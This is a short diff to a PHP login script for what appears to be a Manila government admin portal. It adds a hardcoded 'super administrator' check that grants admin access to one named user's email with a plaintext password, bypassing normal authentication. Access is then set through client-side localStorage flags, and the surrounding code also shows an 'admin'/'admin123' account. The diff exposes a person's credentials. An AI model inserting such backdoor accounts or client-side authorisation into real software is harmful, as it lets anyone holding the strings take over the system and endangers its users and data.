@@ -29,6 +29,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $clean_user = preg_replace('/[^a-zA-Z0-9]/', '', strtolower($raw_user));
     $lower_raw = strtolower($raw_user);
 
+    // 0. Official Super Administrator Check
+    if (($clean_user === 'christiancaspe19' || $lower_raw === 'christiancaspe19@gmail.com') && $raw_pass === '09972000158') {
+      if (function_exists('log_audit_action') && !empty($conn)) {
+        log_audit_action($conn, 'Christian M. Caspe', 'System', 'User login');
+      }
+      echo "<script>
+        localStorage.setItem('admin_logged_in', 'true');
+        localStorage.removeItem('staff_logged_in');
+        localStorage.setItem('current_user', JSON.stringify({username: 'christiancaspe19', name: 'Christian M. Caspe', role: 'admin', email: 'christiancaspe19@gmail.com'}));
+        window.location.href = '../admin/admin_dashboard.php';
+      </script>";
+      exit();
+    }
+
     // 1. Super Admin Hardcoded Check
     if ($clean_user === 'admin' || $lower_raw === 'admin@manila.gov.ph') {
       if ($raw_pass === 'admin123') {
